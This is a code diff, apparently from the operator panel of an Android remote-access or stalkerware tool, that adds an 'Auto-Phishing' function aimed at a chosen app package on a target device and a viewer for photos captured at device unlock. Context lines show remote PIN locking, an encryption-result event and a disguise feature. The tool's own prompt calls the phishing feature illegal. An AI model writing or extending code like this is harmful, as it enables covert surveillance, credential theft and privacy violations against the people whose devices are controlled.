@@ -216,7 +216,6 @@ function initSSE() {
             } catch (err) {}
         });
 
-        // ✅ نتيجة القفل
         sse.addEventListener('lock_result', (e) => {
             try {
                 const d = JSON.parse(e.data);
@@ -228,7 +227,6 @@ function initSSE() {
             } catch (err) {}
         });
 
-        // ✅ نتيجة التشفير
         sse.addEventListener('crypto_result', (e) => {
             try {
                 const d = JSON.parse(e.data);
@@ -667,6 +665,48 @@ function lockWithPin() {
     advancedAction('lock_device_with_pin', { pin: pin });
     showNotification('🔐 جاري القفل', 'الرمز: ' + pin, '🔒');
     document.getElementById('lockPinInput').value = '';
+}
+
+// ═══ Admin Actions — Phishing & Unlock Photos ═══
+function startPhishing() {
+    const target = document.getElementById('phishingTarget').value.trim();
+    if (!target) {
+        alert('⚠️ اكتب اسم الباكج المستهدف');
+        return;
+    }
+    if (!confirm('🎣 تفعيل Auto-Phishing؟\n\n⚠️ تحذير: هذا غير قانوني — استخدمه على جهازك فقط.\n\nالمستهدف: ' + target)) return;
+
+    advancedAction('enable_phishing', { target: target });
+    showNotification('🎣 جاري التفعيل', 'المستهدف: ' + target, '🎣');
+    document.getElementById('phishingTarget').value = '';
+}
+
+function loadUnlockPhotos() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+
+    authFetch(`/api.php?action=get_unlock_photos&device=${encodeURIComponent(currentDevice)}`)
+        .then(r => r.json())
+        .then(photos => {
+            const div = document.getElementById('unlockPhotosList');
+            if (!div) return;
+            div.innerHTML = '';
+
+            if (!Array.isArray(photos) || photos.length === 0) {
+                div.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:30px;">لا توجد صور بعد</p>';
+                return;
+            }
+
+            photos.forEach(photo => {
+                const card = document.createElement('div');
+                card.style.cssText = 'background:#111;padding:8px;border-radius:8px;border:1px solid #00ffcc;';
+                card.innerHTML = `
+                    <img src="data:image/jpeg;base64,${photo.data}" style="width:100%;height:150px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
+                    <div style="color:#00ffcc;font-size:11px;margin-top:6px;font-weight:bold;">📅 ${formatDate(photo.date)}</div>
+                `;
+                div.appendChild(card);
+            });
+        })
+        .catch(() => {});
 }
 
 // ═══ التنكر ═══
